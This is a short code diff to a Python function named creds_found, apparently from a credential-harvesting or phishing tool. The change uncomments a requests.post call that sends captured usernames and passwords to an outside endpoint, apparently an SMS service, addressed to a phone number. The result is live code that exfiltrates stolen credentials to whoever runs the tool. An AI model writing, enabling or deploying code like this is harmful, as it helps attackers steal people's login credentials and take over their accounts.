@@ -33,8 +33,8 @@ def creds_found(user, psk):
         "to":"94762666204",
         "message":f"creds enterd username:{user} password: {psk}"
     }
-    # res  = requests.post(url=endpoint,params=param)
-    # print(res.json())
+    res  = requests.post(url=endpoint,params=param)
+    print(res.json())
     print(user, psk)
 
 
